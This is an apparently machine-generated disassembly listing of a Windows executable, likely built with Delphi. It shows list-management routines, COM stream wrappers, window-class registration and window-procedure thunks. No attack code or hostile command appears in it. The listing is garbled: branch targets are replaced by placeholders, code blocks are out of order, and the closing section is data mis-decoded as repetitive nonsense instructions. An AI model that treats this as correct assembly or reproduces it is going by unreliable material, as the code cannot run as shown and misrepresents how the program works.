jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41fd68
sub_41fe78
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41a238
call sub_41fe78
inc edi
dec esi
jne r-xdata
sub_41feb4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41a37c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_40324c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41fed8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41feb4
mov edx ebx
mov eax esi
call sub_41feb4
pop esi
pop ebx
retn
sub_41fef4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41fed8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a238
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41ff50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41fcfc
push ebx
push sub_41fd24
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41fd10
push ebx
push sub_41fd30
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420048
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408080
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4200e0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
sub_4200e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_41a238
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408080
test al al
jne r-xdata
sub_420130
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043a8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408204
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
xor edx edx
mov eax ebx
call sub_4202b0
mov edx esi
mov eax ebx
call sub_4201bc
mov dl 0x1
mov eax ebx
call sub_4202b0
sub_4201d0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a238
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a1c4
sub_42020c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41a294
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a128
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41a2b4
sub_420260
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4201fc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4201d0
mov cl 0x1
mov edx ebx
call sub_420260
inc edi
dec ebp
jne r-xdata
sub_4202b0
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404238
mov edx esp
mov eax esi
call sub_403520
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_4202f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420320
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420368
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4203a8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4203c6
mov eax eax
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4203ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_420434
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
mov edx esi
call sub_420664
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42049c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_420664
mov edx ebx
mov eax esi
call sub_420658
sub_4204e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fbd8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_420524
push ebx
push esi
push edi
call sub_4035d8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fc24
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41fed8
jmp r-xdata
mov eax esi
call sub_41a320
mov edx eax
mov eax edi
call sub_420664
lea eax [ edi + 0x50 ]
call sub_40d420
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_420584
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41fef4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_4205b0
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_4205cc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4205e6
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_41a238
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_420664
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a128
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_41a238
cmp ebp eax
jne r-xdata
sub_4206a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41fed8
mov edx ebx
call sub_41fca8
sub_4206d0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_420718
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_40324c
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_420750
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42079f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4207b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_420807
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420820
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42088a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_4208a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4208ed
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41befc
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_420908
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405a40
xor eax eax
push ebp
push sub_420af5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_420ace
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4027b4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_420abd
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027d4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420afc
lea eax [ ebp + 0xc ]
call sub_4059cc
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_420b38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_420b9b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420bcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_41a5a4
mov edi eax
xor eax eax
push ebp
push sub_420c21
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c28
mov eax [ rw-data ]
call sub_41a608
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a238
call sub_40324c
inc esi
dec ebx
jne r-xdata
sub_420c3e
mov eax eax
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_420c68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4029b0
mov edx r-xdata
lea eax [ esi + 0x5 ]
call sub_420c60
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_420c60
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_420d24
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d8c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420c68
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_420dd8
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_420d00
sub_420dfe
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_420ea4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420eab
retn
mov eax [ rw-data ]
call sub_419a28
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_420bcc
xor edx edx
xor eax eax
call sub_41cdfc
mov eax rw-data
call sub_40d420
call sub_406118
lea eax [ eax + 0xc ]
call sub_40d420
mov eax rw-data
call sub_40d420
mov eax rw-data
call sub_4059cc
mov eax sub_420c38
call sub_405868
mov eax rw-data
call sub_40d420
call sub_41f9f8
mov eax rw-data
call sub_40d420
mov eax rw-data
call sub_4059cc
sub_420eb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_420f39
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f40
retn
call sub_41f9c4
mov eax sub_420c38
call sub_405860
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d160
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4059e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_419324
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a44c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a44c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_420f44
push 0x710047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x730047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x760047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x780047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x600047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x620047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x640047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x660047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x680047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x500047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x520047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x540047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x560047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x580047a6
inc [ eax ]
